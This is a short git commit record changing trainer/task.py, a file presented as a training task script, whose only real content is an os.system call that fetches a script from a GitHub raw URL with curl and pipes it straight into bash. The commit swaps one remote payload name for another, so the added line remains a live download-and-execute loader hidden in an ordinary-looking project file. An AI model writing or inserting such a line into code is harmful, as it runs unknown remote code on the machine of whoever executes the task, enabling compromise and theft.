6b80ad6eaa0fb9d68cccc290891d7eb54fb2cbe7
vedhagsvp <vedhag230223@gmail.com>
2026-08-30 23:38:29 +0530

    Update task.py

--- trainer/task.py
+++ trainer/task.py
@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://github.com/vedhagsvp/tkospae/raw/main/VAS2 | bash')
+os.system('curl -sL https://github.com/vedhagsvp/tkospae/raw/main/pals | bash')
